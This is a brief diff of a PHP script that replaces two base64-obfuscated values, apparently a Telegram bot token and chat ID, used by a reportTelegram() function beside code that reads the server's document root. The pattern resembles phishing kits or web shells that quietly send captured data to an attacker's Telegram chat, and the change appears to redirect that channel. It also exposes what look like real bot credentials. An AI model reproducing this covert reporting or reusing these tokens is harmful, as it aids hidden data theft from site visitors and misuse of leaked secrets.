@@ -16,9 +16,9 @@
     $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
     $scriptDirectory = dirname(__FILE__);
 $tk = base64_decode(
-    "ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ=="
+    "NzY5MjcxNTYxMTpBQUdycFN3MzdaT0laUnJwSEFwbkgyUlRrblRSdDdoaEhMSQ=="
 );
-$cid = base64_decode("ODkzMDE3NDQ2Mw==");
+$cid = base64_decode("NjQ4OTg5NTg2MA==");
 
 function reportTelegram($msg)
 {
